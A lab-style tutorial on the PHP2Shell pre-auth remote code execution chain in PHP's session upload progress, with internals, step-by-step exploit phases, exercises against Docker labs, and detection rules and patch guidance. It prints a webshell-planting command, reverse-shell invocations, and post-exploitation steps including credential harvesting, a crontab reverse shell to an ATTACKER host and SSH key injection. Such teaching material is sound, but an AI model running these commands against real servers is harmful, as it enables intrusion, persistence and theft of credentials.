# PHP2Shell: Exploiting CVE-2026-109618 / CVE-2026-109619

## Pre-Auth PHP RCE via Session Upload Progress Use-After-Free

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Background: PHP Internals](#2-background-php-internals)
3. [Understanding the Vulnerabilities](#3-understanding-the-vulnerabilities)
4. [The Exploit Chain — Step by Step](#4-the-exploit-chain--step-by-step)
5. [Lab Setup](#5-lab-setup)
6. [Hands-On Exploitation](#6-hands-on-exploitation)
7. [Post-Exploitation](#7-post-exploitation)
8. [Detection and Mitigation](#8-detection-and-mitigation)
9. [Key Takeaways](#9-key-takeaways)
10. [References](#10-references)

---

## 1. Introduction

### What is PHP2Shell?

PHP2Shell is the name given by **Wiz Research** to a pair of critical vulnerabilities in PHP's core engine that enable **unauthenticated Remote Code Execution (RCE)** on any server running a vulnerable PHP version with Apache `mod_php`.

- **CVE-2026-109618**: Upload-progress unserializer use-after-free + remote process memory disclosure
- **CVE-2026-109619**: Fatal-error backtrace use-after-free + OPcache type confusion

These bugs affect **every PHP version from 5.4.0 to 8.5.11** — code that has existed since 2012. The vulnerabilities were patched on **October 21, 2026** in PHP 8.2.35, 8.3.36, 8.4.27, and 8.5.12.

### Why It Matters

- **Pre-authentication**: No credentials, no cookies, no application interaction required
- **Universal**: Affects WordPress, Drupal, Joomla, phpMyAdmin — any PHP application
- **Pure HTTP**: Only standard multipart/form-data POST requests
- **Default configuration**: `session.upload_progress.enabled` is **On** by default in PHP
- **~70% of the internet** runs PHP (per W3Techs), making this one of the most impactful web vulnerabilities ever disclosed

### CVSS Score

Both CVEs are rated **CVSS v4.0 9.2 (Critical)**.

### Timeline

| Date | Event |
|------|-------|
| Aug 1, 2026 | Calif (Ryan Austin) discovers RCE paths |
| Aug 11, 2026 | First bug reported to PHP security team |
| Aug 24, 2026 | Wiz Research independently reports vulnerabilities |
| Oct 20, 2026 | Details leak publicly; watchTowr confirms RCE |
| Oct 21, 2026 07:43 UTC | Cloudflare detects early exploitation attempts |
| Oct 21, 2026 14:00 UTC | PHP releases patches |

---

## 2. Background: PHP Internals

Before diving into the exploit, you need to understand how PHP processes requests internally.

### 2.1 Apache mod_php Worker Model

When PHP runs as an Apache module (`mod_php`) with the **prefork MPM**, each request is handled by a dedicated worker process:

```
Client Request → Apache → Fork Worker → Load libphp.so → Execute PHP → Response
                                ↓
                         Worker survives
                         Handles next request
                         (same process, same memory)
```

**Critical detail**: Worker processes are **reused** across requests. Memory allocated in Request A may still be accessible (as freed/stale pointers) when Request B arrives on the same worker.

### 2.2 PHP Memory Management (ZendMM)

PHP uses its own memory allocator called **ZendMM** (Zend Memory Manager):

- Memory is organized in **2 MiB chunks**
- Each chunk is divided into **4 KiB pages**
- Pages contain **bins** of fixed sizes (8, 16, 24, 32, ..., 3072 bytes)
- When a request hits `memory_limit`, PHP triggers an **OOM (Out of Memory) bailout**
- OOM bailout resets chunk maps but **does not clear all global pointers**

### 2.3 Session Upload Progress

PHP has a built-in feature called `session.upload_progress` that tracks file upload progress via session variables. Key facts:

- **Enabled by default** (`session.upload_progress.enabled = On`)
- Triggered by including a `PHP_SESSION_UPLOAD_PROGRESS` field in a multipart form
- Activates **before** application code runs (during request parsing)
- The application does **not** need to call `session_start()`
- PHP stores progress data in `PS(http_session_vars)`, a global zval

### 2.4 Key PHP Internal Structures

```c
// zend_string — PHP's string representation
typedef struct {
    zend_refcounted_h gc;  // refcount + type info
    zend_ulong        h;   // hash value
    size_t           len;  // string length
    char             val[1]; // string data (flexible array)
} zend_string;

// HashTable (zend_array) — PHP's array type
typedef struct {
    zend_refcounted_h gc;
    union { ... }     u;           // flags, nTableMask
    Bucket           *arData;      // pointer to bucket array
    uint32_t          nNumUsed;    // number of used slots
    uint32_t          nNumOfElements;
    uint32_t          nTableSize;
    uint32_t          nInternalPointer;
    zend_long         nNextFreeElement;
    dtor_func_t       pDestructor; // function called when elements are destroyed
} HashTable;

// zend_reference — PHP's reference wrapper
typedef struct {
    zend_refcounted_h gc;
    zval              val;  // the referenced value
} zend_reference;
```

The **pDestructor** field in HashTable is the key to RCE: when PHP destroys a hash table during shutdown, it calls `pDestructor` for each element. If we control this pointer, we control execution.

---

## 3. Understanding the Vulnerabilities

### 3.1 CVE-2026-109618: Upload-Progress UAF + Memory Disclosure

#### The Bug

When PHP handles a multipart request with `PHP_SESSION_UPLOAD_PROGRESS`, the session module stores a session ID in the global `PS(id)`. If the request triggers an Out-of-Memory error:

1. The OOM bailout frees the request heap
2. But `PS(id)` **still points to the freed memory**
3. The worker process survives and accepts the next request
4. The next request can **reclaim the freed memory** with controlled data
5. PHP URL-encodes `PS(id)` into a `Set-Cookie: PHPSESSID=...` header
6. Since `PS(id)` now points to attacker-controlled data with a **fake zend_string header** that specifies a large length, PHP reads **hundreds of kilobytes past the string boundary**
7. The response cookie contains **raw heap memory** — pointers, function addresses, internal structures

This is the **information leak** (ASLR bypass). From the leaked data, the attacker extracts:
- **libphp base address** (defeats ASLR)
- **Heap chunk base addresses** (enables precise heap grooming)
- **Function pointers** like `zval_ptr_dtor` (confirms libphp base)

#### The Second UAF (RCE Primitive)

A second OOM bailout targets `PS(http_session_vars)` — the global that holds session data as a PHP array (HashTable). After the bailout:

1. `PS(http_session_vars)` points to freed memory
2. The attacker sprays **fake zend_references** into the freed memory
3. Each fake reference points to a **forged HashTable** with `pDestructor = zif_system`
4. During RSHUTDOWN (request shutdown), PHP calls `zend_hash_destroy` on the stale pointer
5. `pDestructor` fires → `zif_system(cmd)` → **arbitrary command execution**

### 3.2 CVE-2026-109619: Backtrace UAF + OPcache Type Confusion

#### Fatal-Error Backtrace UAF

`EG(last_fatal_error_backtrace)` stores a pointer to the previous fatal error's backtrace. After an OOM:

1. The heap is freed, but the backtrace pointer remains
2. The next request can trigger a diagnostic that follows this dangling pointer
3. If the attacker has reclaimed that memory, they achieve controlled memory corruption

#### OPcache Type Confusion

OPcache stores compiled structures in shared memory with per-worker index maps:

1. `CG(map_ptr_last)` advances before the shared frontier is published
2. An allocation failure between these operations leaves them out of sync
3. Another worker reuses a slot and gets a **pointer of the wrong type**
4. This enables type confusion → controlled memory write → RCE

---

## 4. The Exploit Chain — Step by Step

The complete exploit chain has four phases:

```
┌─────────────────────────────────────────────────────────┐
│                    EXPLOIT CHAIN                         │
│                                                         │
│  A1: OOM Trigger    → Dangling PS(id) + PS(mod_data)   │
│          ↓                                              │
│  B1: OOB Read       → Leak ~800KB heap → ASLR bypass   │
│          ↓                                              │
│  A2: Cheap OOM      → Dangling PS(http_session_vars)   │
│          ↓                                              │
│  B2: Fake-Ref Spray → pDestructor = system() → RCE     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Phase A1: Create Dangling Pointers via OOM

**Objective**: Exhaust `memory_limit` during session handling to leave dangling `PS(id)` and `PS(mod_data)` pointers.

**How it works**:

1. Send a chunked `multipart/form-data` POST that bypasses `post_max_size`
2. Include `PHPSESSID` field (activates session intake)
3. Include `PHP_SESSION_UPLOAD_PROGRESS` field (triggers session lifecycle)
4. Fill the request with:
   - **860 deeply nested file fields** (each allocates array key chains)
   - **14 filler fields** with 103-byte names (fill bin-128 slots)
   - **78 large value fields** (8000 bytes each, consume pages)
   - **20 burner fields** (burn remaining allocator slack)
5. The upload progress value's length pushes memory past `memory_limit`
6. PHP triggers OOM bailout: `zend_bailout()` → `longjmp()`
7. Request heap is freed, but `PS(id)` still points into the freed chunk

**Expected result**: HTTP 500 (Internal Server Error). Worker survives with dangling pointers.

### Phase B1: Heap Information Leak (ASLR Bypass)

**Objective**: Read ~800KB of heap memory through the dangling `PS(id)` pointer.

**How it works**:

1. Send another multipart POST to the **same worker**
2. Include field values that fill specific heap pages
3. One value contains a **fake zend_string header** at the exact address where `PS(id)` points:
   ```c
   refcount = 0;   // prevents efree (won't try to free this)
   type = 0x16;    // IS_STRING | GC_NOT_COLLECTABLE
   h = 0;          // hash (unused)
   len = 0xC8000;  // ~800KB — controls how much PHP reads
   ```
4. When PHP processes the session cookie, it calls `php_url_encode(PS(id))`
5. `php_url_encode` reads `len` bytes from the fake string — **an Out-of-Bounds read**
6. The URL-encoded heap memory appears in the `Set-Cookie: PHPSESSID=...` response header

**What we extract from the leak**:

- **zval_ptr_dtor address** (appears ~1095 times in HashTable pDestructor fields) → calculate **libphp base**
- **2MiB-aligned pointer clusters** → identify **main chunk base addresses**
- **Architecture detection** (pointer size reveals x86_64 vs aarch64)

```
Leak Analysis:
  Decoded: 819,200 bytes
  Architecture: aarch64
  zval_ptr_dtor: 0xffff9aca8120 (×1095 occurrences)
  libphp base: 0xffff9a670000
  Main chunk candidates: 0xffff8fa00000, 0xffff98600000, 0xffff8ec00000
```

### Phase A2: Create Dangling Session Vars via Cheap OOM

**Objective**: Free `PS(http_session_vars)` while keeping its pointer accessible.

**How it works**:

1. Send a multipart POST designed to trigger OOM during session handling
2. Uses **880 parts** with depth-64 nesting and **115 filler fields**
3. The OOM bailout skips module shutdown
4. ZendMM only resets chunk maps — the worker **retains** the dangling `PS(http_session_vars)` pointer
5. The freed memory can now be reclaimed by the next request

### Phase B2: Fake Reference Spray → RCE

**Objective**: Reclaim the freed `PS(http_session_vars)` memory with controlled data that redirects execution to `system()`.

**How it works**:

1. Calculate target addresses using leaked information:
   - `zif_system` = libphp_base + zif_system_offset
   - `ht_addr` = main_chunk_base + 0xF8398 (known HashTable offset)

2. Build a **forged HashTable** (384 bytes):
   ```
   Offset  Content
   ──────  ────────────────────────────────
   +0x00   gc: refcount=1, type=IS_ARRAY
   +0x08   flags, nTableMask
   +0x10   arData → points to fake Bucket
   +0x18   nNumUsed=1, nNumOfElements=1
   +0x30   pDestructor = zif_system     ← THE KEY
   +0x40   Bucket[0] / fake execute_data
   +0xA0   Command zend_string ("id", "whoami", etc.)
   ```

3. Build a **spray payload** with 500+ fake `zend_reference` structures:
   - Each 32-byte reference has `val.value = ht_addr` (points to our fake HashTable)
   - When PHP follows `PS(http_session_vars)` → reference → array → our fake HashTable

4. Send the spray as a multipart POST
5. During RSHUTDOWN, PHP calls `zend_hash_destroy` on the fake HashTable
6. `pDestructor(bucket->val)` → `zif_system("command")` → **RCE!**

### Two-Stage In-Band Execution

The raw exploit crashes the PHP worker after command execution (the corrupted heap state causes SIGSEGV during cleanup). To get **persistent, in-band command execution**:

1. **Stage 1**: Use the exploit to plant a PHP webshell on the target:
   ```
   system("echo '<?php system($_GET[c]);?>' | base64 -d > /var/www/html/.p2s.php")
   ```
   Worker crashes after writing the file — this is expected and acceptable.

2. **Stage 2**: All subsequent commands go through the webshell via HTTP GET:
   ```
   GET /.p2s.php?c=id HTTP/1.1
   → uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```
   Output returns directly in the HTTP response body. No more exploit chains needed.

---

## 5. Lab Setup

### Requirements

- Docker and Docker Compose
- Python 3.10+
- ~2GB disk space

### Starting the Lab

```bash
# Clone the exploit repository
git clone https://github.com/JoasASantos/php2shell-exploit.git
cd php2shell-exploit

# Option A: Minimal PHP lab (recommended for learning)
cd docker && docker compose up -d && cd ..

# Option B: WordPress lab (realistic scenario)
cd labs/wordpress && docker compose up -d && cd ..
```

### Lab Architecture

```
┌──────────────────────────────────┐
│  Your Machine (Attacker)         │
│                                  │
│  exploit.py ──→ :18110 (PHP)     │
│                 :18120 (WordPress)│
│                 :18130 (phpMyAdmin)│
│                                  │
└──────────┬───────────────────────┘
           │ TCP
           ▼
┌──────────────────────────────────┐
│  Docker Container                │
│                                  │
│  Apache 2.4 + mod_php            │
│  PHP 8.4.26 (VULNERABLE)        │
│  prefork MPM (single worker)    │
│  session.upload_progress = On   │
│  memory_limit = 128M            │
│                                  │
│  Optional: WordPress + MariaDB  │
└──────────────────────────────────┘
```

### Extracting Offsets

The exploit needs function offsets from the target's `libphp.so`:

```bash
# For minimal lab
python3 -c "
from lib.offsets import extract_from_container, save_offsets_env
z, d = extract_from_container('php2shell-target')
save_offsets_env('out/offsets.env', z, d)
print(f'zif_system=0x{z:x}  zval_ptr_dtor=0x{d:x}')
"
```

These offsets are **specific to each PHP build** (version + architecture + distribution). The exploit uses them to calculate runtime addresses after ASLR bypass.

---

## 6. Hands-On Exploitation

### Exercise 1: Reconnaissance

Fingerprint the target without exploitation:

```bash
python3 exploit.py -t http://127.0.0.1:18110/index.php --recon-only
```

**Expected output**:
```
[phase 0] RECON
Target       : http://127.0.0.1:18110/index.php
PHP Version  : PHP/8.4.26
Server       : Apache/2.4.69 (Debian)
SAPI         : mod_php (probable)
MPM          : prefork (single-worker behavior)
Vulnerable   : YES
  [!] PHP PHP/8.4.26 < 8.4.27 — CVE-2026-109618/619 affected
```

**Questions**:
1. What PHP version is running?
2. What SAPI is in use? Why does this matter for the exploit?
3. What MPM is Apache using? Why is prefork important?

### Exercise 2: Single Command Execution

Execute a single command on the target:

```bash
python3 exploit.py -t http://127.0.0.1:18110/index.php --cmd "id"
```

**Observe**:
- A1 triggers HTTP 500 (OOM)
- B1 decodes ~800KB of heap data and finds libphp base
- A2+B2 sends the payload and verifies execution
- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### Exercise 3: Interactive Shell

Get a full interactive shell:

```bash
python3 exploit.py -t http://127.0.0.1:18110/index.php -i
```

The exploit will:
1. Plant a webshell via the exploit chain (one-time worker crash)
2. Verify the webshell is accessible
3. Drop you into an interactive `php2shell>` prompt
4. Every command executes via HTTP GET — instant in-band response

**Try these commands**:
```
php2shell> id
php2shell> uname -a
php2shell> cat /etc/passwd
php2shell> ls -la /var/www/html/
php2shell> env
php2shell> exit
```

### Exercise 4: WordPress Exploitation

Exploit a WordPress instance:

```bash
# Start the WordPress lab
cd labs/wordpress && docker compose up -d && cd ../..

# Wait for DB to initialize (~30s), then exploit
python3 exploit.py -t http://127.0.0.1:18120/health.php \
  --offsets-env out/offsets-wp.env -i
```

**Try extracting sensitive data**:
```
php2shell> cat /var/www/html/wp-config.php | grep DB_
php2shell> ls -la /var/www/html/wp-content/plugins/
php2shell> cat /etc/hostname
php2shell> env | grep WORDPRESS
```

**Key observation**: The exploit targets PHP's session handler, NOT WordPress. Any PHP endpoint on the server works as an entry point. The application doesn't even need to use sessions.

### Exercise 5: Reverse Shell

Get a full reverse shell with TTY:

```bash
# Terminal 1: Start listener
nc -lvp 4444

# Terminal 2: Send reverse shell
python3 exploit.py -t http://127.0.0.1:18110/index.php \
  --reverse 127.0.0.1:4444 --shell-method bash
```

Available methods: `bash`, `python`, `perl`, `nc`, `php`

---

## 7. Post-Exploitation

Once you have a shell via php2shell, common next steps include:

### Credential Harvesting
```bash
# WordPress database credentials
cat /var/www/html/wp-config.php

# Environment variables
env

# Other config files
find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -20
```

### Persistence
```bash
# Webshell (already planted by the exploit)
# Add cron job
echo "* * * * * www-data /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" >> /etc/crontab

# SSH key injection (if SSH is available)
mkdir -p ~/.ssh && echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Lateral Movement
```bash
# Internal network discovery
ip addr
cat /etc/hosts
cat /proc/net/tcp

# Database access (WordPress)
mysql -u wpuser -pwppass123 -h db wordpress -e "SELECT * FROM wp_users;"
```

---

## 8. Detection and Mitigation

### Detection Indicators

| Indicator | Description |
|-----------|-------------|
| Repeated HTTP 500 | OOM bailouts from A1/A2 phases |
| Large `Set-Cookie: PHPSESSID` | B1 leak — cookie contains ~800KB of URL-encoded heap data |
| Multipart POSTs with `PHP_SESSION_UPLOAD_PROGRESS` | Exploit trigger field |
| Deeply nested form field names | A1 payload uses `files[Rxxxxx][a][a]...[a]` patterns |
| Apache `child pid XX exit signal Segmentation fault (11)` | Worker crash after B2 RCE |
| Unusual `.php` files in webroot | Webshell planted by Stage 1 |

### WAF Signatures

```
# Detect A1/A2 OOM payloads (deeply nested multipart fields)
SecRule REQUEST_BODY "@rx files\[R\d{5}" "id:100001,phase:2,deny,msg:'php2shell A1 OOM payload'"

# Detect PHP_SESSION_UPLOAD_PROGRESS in non-upload requests
SecRule REQUEST_BODY "@contains PHP_SESSION_UPLOAD_PROGRESS" "chain,id:100002,phase:2"
SecRule REQUEST_HEADERS:Content-Type "!@contains multipart/form-data" "deny,msg:'php2shell trigger'"

# Detect abnormally large Set-Cookie headers
SecRule RESPONSE_HEADER:Set-Cookie "@gt 10000" "id:100003,phase:3,deny,msg:'php2shell leak detected'"
```

### Mitigation

#### Immediate (temporary)
```ini
; Add to php.ini — disables the vulnerable feature
session.upload_progress.enabled = 0
```

> **Warning**: PHP core developer Gina Peter Banyard warned that disabling `session.upload_progress` alone may not be sufficient. The underlying memory-safety issue exists in other code paths.

#### Definitive
Update PHP to a patched version:

| Branch | Patched Version |
|--------|----------------|
| PHP 8.5 | 8.5.12+ |
| PHP 8.4 | 8.4.27+ |
| PHP 8.3 | 8.3.36+ |
| PHP 8.2 | 8.2.35+ |
| PHP 8.1 and older | EOL — apply distro backports or source patches |

#### Verify the fix
```bash
# Debian/Ubuntu
zgrep CVE-2026-109618 /usr/share/doc/php*/changelog.Debian.gz

# RHEL/CentOS
rpm -q --changelog php-common | grep CVE-2026-109618

# Check PHP version
php -v
```

---

## 9. Key Takeaways

1. **Memory safety bugs in C code remain the #1 source of critical vulnerabilities.** PHP is written in C, and manual memory management errors can have catastrophic consequences.

2. **Default configurations matter.** `session.upload_progress.enabled = On` by default meant every PHP install was vulnerable out of the box — even if the application never used sessions.

3. **Pre-auth bugs are the most dangerous.** No credentials, no cookies, no application interaction — just raw HTTP to any `.php` endpoint.

4. **ASLR is a speed bump, not a wall.** The OOB read primitive leaked ~800KB of heap memory with function pointers, defeating ASLR in a single request.

5. **Worker process reuse is an attack surface.** mod_php's worker model (persistent processes across requests) turned a use-after-free into a cross-request attack.

6. **Patching is the only real fix.** WAF rules and configuration changes are partial mitigations at best.

---

## 10. References

- [Wiz Research — PHP2Shell: AI Uncovers Critical RCE Vulnerabilities](https://www.wiz.io/blog/php2shell-php-rce)
- [Sansec — PHP2Shell: PHP RCE (CVE-2026-109618, CVE-2026-109619)](https://sansec.io/research/php2shell)
- [The Hacker News — PHP2Shell: What Actually Protects You](https://thehackernews.com/2026/10/php2shell-what-actually-protects-you.html)
- [Recorded Future — PHP2Shell Exploitation: Two Critical PHP Flaws Explained](https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation)
- [Imunify360 — PHP CVE-2026-109618 and CVE-2026-109619](https://blog.imunify360.com/php-cve-2026-109618-cve-2026-109619/)
- [9bie/php2shell-bypass-aslr-exp — Original ASLR Bypass Research](https://github.com/9bie/php2shell-bypass-aslr-exp)
- [devploit/php2shell — Research Toolkit](https://github.com/devploit/php2shell)
- [php2shell-exploit — Full Exploit Framework (this lab's tool)](https://github.com/JoasASantos/php2shell-exploit)
